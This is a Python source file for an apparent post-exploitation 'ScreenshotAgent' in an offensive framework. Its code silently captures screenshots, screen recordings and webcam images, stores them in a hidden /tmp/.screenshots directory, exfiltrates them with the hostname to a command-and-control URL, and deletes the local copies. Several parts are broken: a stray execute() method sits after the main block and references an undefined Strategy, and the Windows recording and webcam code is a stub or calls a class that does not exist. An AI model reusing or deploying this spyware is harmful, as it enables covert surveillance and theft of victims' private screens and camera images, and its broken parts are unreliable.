"""
Advanced Screenshot Agent
Periodic screenshots, event-triggered capture, screen recording, webcam capture
"""

import asyncio
import os
import platform
import subprocess
from typing import Dict, List, Optional
from datetime import datetime
import base64
import logging

from core.base_agent import BaseAgent
from core.data_models import AgentData, AttackPhase
from core.logger import log

logger = logging.getLogger(__name__)


class ScreenshotAgent(BaseAgent):
    """
    Advanced screenshot and screen recording agent
    
    Features:
    - Periodic screenshots
    - Event-triggered capture
    - Screen recording
    - Webcam capture
    - Multi-monitor support
    - Automatic exfiltration to C2
    """
    
    supported_phases = [AttackPhase.POST_EXPLOITATION]
    required_tools = []
    
    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.os_type = platform.system().lower()
        self.screenshot_dir = "/tmp/.screenshots"
        self.running = False
        self.capture_interval = 60  # 1 minute
        
        # C2 configuration
        self.c2_url = os.getenv('C2_URL', 'http://localhost:8000')
        
        # Create screenshot directory
        os.makedirs(self.screenshot_dir, exist_ok=True)
    
    async def run(self, directive: str, context: Dict) -> AgentData:
        """
        Main execution method
        
        Args:
            directive: "start", "stop", "capture", "record", "webcam", "status"
            context: {
                "interval": seconds between captures (default: 60),
                "duration": recording duration in seconds (for record),
                "output_dir": custom output directory,
                "quality": image quality 1-100 (default: 85)
            }
        
        Returns:
            AgentData with screenshot results
        """
        log.info(f"[ScreenshotAgent] {directive} on {self.os_type}")
        
        try:
            if directive == "start":
                self.capture_interval = context.get("interval", 60)
                self.screenshot_dir = context.get("output_dir", self.screenshot_dir)
                quality = context.get("quality", 85)
                
                result = await self.start_periodic_capture(quality)
            
            elif directive == "stop":
                result = await self.stop_capture()
            
            elif directive == "capture":
                quality = context.get("quality", 85)
                result = await self.capture_screenshot(quality)
            
            elif directive == "record":
                duration = context.get("duration", 30)
                result = await self.record_screen(duration)
            
            elif directive == "webcam":
                result = await self.capture_webcam()
            
            elif directive == "status":
                result = await self.get_status()
            
            else:
                result = await self.capture_screenshot(85)
            
            return AgentData(
                agent_name="ScreenshotAgent",
                success=result.get("success", False),
                data=result
            )
        
        except Exception as e:
            log.error(f"[ScreenshotAgent] Error: {e}")
            return AgentData(
                agent_name="ScreenshotAgent",
                success=False,
                data={"error": str(e)}
            )
    
    async def start_periodic_capture(self, quality: int = 85) -> Dict:
        """Start periodic screenshot capture"""
        
        log.info(f"[ScreenshotAgent] Starting periodic capture every {self.capture_interval}s")
        
        self.running = True
        asyncio.create_task(self._periodic_capture_loop(quality))
        
        return {
            "success": True,
            "message": f"Periodic capture started (interval: {self.capture_interval}s)",
            "output_dir": self.screenshot_dir
        }
    
    async def stop_capture(self) -> Dict:
        """Stop periodic capture"""
        
        log.info("[ScreenshotAgent] Stopping capture")
        self.running = False
        
        return {
            "success": True,
            "message": "Capture stopped"
        }
    
    async def get_status(self) -> Dict:
        """Get capture status"""
        
        screenshot_count = len([f for f in os.listdir(self.screenshot_dir) if f.endswith('.png')])
        
        return {
            "success": True,
            "running": self.running,
            "os": self.os_type,
            "output_dir": self.screenshot_dir,
            "screenshot_count": screenshot_count,
            "interval": self.capture_interval
        }
    
    async def capture_screenshot(self, quality: int = 85) -> Dict:
        """Capture a single screenshot"""
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{timestamp}.png"
        filepath = os.path.join(self.screenshot_dir, filename)
        
        try:
            if self.os_type == "linux":
                result = await self._capture_linux(filepath)
            
            elif self.os_type == "windows":
                result = await self._capture_windows(filepath)
            
            elif self.os_type == "darwin":
                result = await self._capture_macos(filepath)
            
            else:
                return {
                    "success": False,
                    "error": f"Unsupported OS: {self.os_type}"
                }
            
            if result:
                # Exfiltrate to C2
                await self._exfiltrate_screenshot(filepath)
                
                return {
                    "success": True,
                    "file": filepath,
                    "size": os.path.getsize(filepath),
                    "timestamp": timestamp
                }
            else:
                return {
                    "success": False,
                    "error": "Screenshot capture failed"
                }
        
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def record_screen(self, duration: int = 30) -> Dict:
        """Record screen for specified duration"""
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"recording_{timestamp}.mp4"
        filepath = os.path.join(self.screenshot_dir, filename)
        
        log.info(f"[ScreenshotAgent] Recording screen for {duration}s")
        
        try:
            if self.os_type == "linux":
                # Use ffmpeg
                cmd = [
                    "ffmpeg", "-video_size", "1920x1080", "-framerate", "25",
                    "-f", "x11grab", "-i", ":0.0", "-t", str(duration),
                    "-c:v", "libx264", "-preset", "ultrafast", filepath
                ]
                
                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.DEVNULL,
                    stderr=asyncio.subprocess.DEVNULL
                )
                
                await proc.wait()
            
            elif self.os_type == "windows":
                # Use PowerShell with Windows.Graphics.Capture API
                ps_script = f'''
$duration = {duration}
$output = "{filepath}"
# Recording implementation would go here
'''
                
                proc = await asyncio.create_subprocess_exec(
                    "powershell", "-Command", ps_script,
                    stdout=asyncio.subprocess.DEVNULL,
                    stderr=asyncio.subprocess.DEVNULL
                )
                
                await proc.wait()
            
            else:
                return {
                    "success": False,
                    "error": "Screen recording not supported on this OS"
                }
            
            if os.path.exists(filepath):
                return {
                    "success": True,
                    "file": filepath,
                    "size": os.path.getsize(filepath),
                    "duration": duration
                }
            else:
                return {
                    "success": False,
                    "error": "Recording file not created"
                }
        
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def capture_webcam(self) -> Dict:
        """Capture image from webcam"""
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"webcam_{timestamp}.jpg"
        filepath = os.path.join(self.screenshot_dir, filename)
        
        log.info("[ScreenshotAgent] Capturing webcam")
        
        try:
            if self.os_type == "linux":
                # Use ffmpeg to capture from /dev/video0
                cmd = [
                    "ffmpeg", "-f", "video4linux2", "-i", "/dev/video0",
                    "-frames:v", "1", filepath
                ]
                
                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.DEVNULL,
                    stderr=asyncio.subprocess.DEVNULL
                )
                
                await proc.wait()
            
            elif self.os_type == "windows":
                # Use PowerShell with DirectShow
                ps_script = f'''
Add-Type -AssemblyName System.Drawing
$webcam = New-Object System.Windows.Forms.WebCam
$webcam.TakeSnapshot("{filepath}")
'''
                
                proc = await asyncio.create_subprocess_exec(
                    "powershell", "-Command", ps_script,
                    stdout=asyncio.subprocess.DEVNULL,
                    stderr=asyncio.subprocess.DEVNULL
                )
                
                await proc.wait()
            
            else:
                return {
                    "success": False,
                    "error": "Webcam capture not supported on this OS"
                }
            
            if os.path.exists(filepath):
                await self._exfiltrate_screenshot(filepath)
                
                return {
                    "success": True,
                    "file": filepath,
                    "size": os.path.getsize(filepath)
                }
            else:
                return {
                    "success": False,
                    "error": "Webcam capture failed"
                }
        
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _capture_linux(self, filepath: str) -> bool:
        """Capture screenshot on Linux"""
        
        # Try multiple methods
        methods = [
            ["scrot", filepath],
            ["import", "-window", "root", filepath],
            ["gnome-screenshot", "-f", filepath],
            ["spectacle", "-b", "-n", "-o", filepath]
        ]
        
        for method in methods:
            try:
                proc = await asyncio.create_subprocess_exec(
                    *method,
                    stdout=asyncio.subprocess.DEVNULL,
                    stderr=asyncio.subprocess.DEVNULL
                )
                
                await proc.wait()
                
                if os.path.exists(filepath):
                    return True
            except:
                continue
        
        return False
    
    async def _capture_windows(self, filepath: str) -> bool:
        """Capture screenshot on Windows"""
        
        ps_script = f'''
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
$bitmap.Save("{filepath}", [System.Drawing.Imaging.ImageFormat]::Png)
$graphics.Dispose()
$bitmap.Dispose()
'''
        
        try:
            proc = await asyncio.create_subprocess_exec(
                "powershell", "-Command", ps_script,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL
            )
            
            await proc.wait()
            
            return os.path.exists(filepath)
        except:
            return False
    
    async def _capture_macos(self, filepath: str) -> bool:
        """Capture screenshot on macOS"""
        
        try:
            proc = await asyncio.create_subprocess_exec(
                "screencapture", "-x", filepath,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL
            )
            
            await proc.wait()
            
            return os.path.exists(filepath)
        except:
            return False
    
    async def _periodic_capture_loop(self, quality: int):
        """Periodic capture loop"""
        
        while self.running:
            try:
                await self.capture_screenshot(quality)
            except Exception as e:
                log.error(f"[ScreenshotAgent] Capture error: {e}")
            
            await asyncio.sleep(self.capture_interval)
    
    async def _exfiltrate_screenshot(self, filepath: str):
        """Exfiltrate screenshot to C2"""
        
        try:
            with open(filepath, 'rb') as f:
                image_data = base64.b64encode(f.read()).decode()
            
            import httpx
            async with httpx.AsyncClient(timeout=30.0) as client:
                await client.post(
                    f"{self.c2_url}/screenshot",
                    json={
                        "hostname": platform.node(),
                        "timestamp": datetime.now().isoformat(),
                        "filename": os.path.basename(filepath),
                        "data": image_data
                    }
                )
            
            log.success(f"[ScreenshotAgent] Screenshot exfiltrated: {filepath}")
            
            # Delete after successful exfiltration
            os.remove(filepath)
        
        except Exception as e:
            log.error(f"[ScreenshotAgent] Exfiltration error: {e}")


# Standalone execution
if __name__ == "__main__":
    async def main():
        agent = ScreenshotAgent()
        result = await agent.run("capture", {})
        print(result)
    
    asyncio.run(main())


    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute screenshot"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )
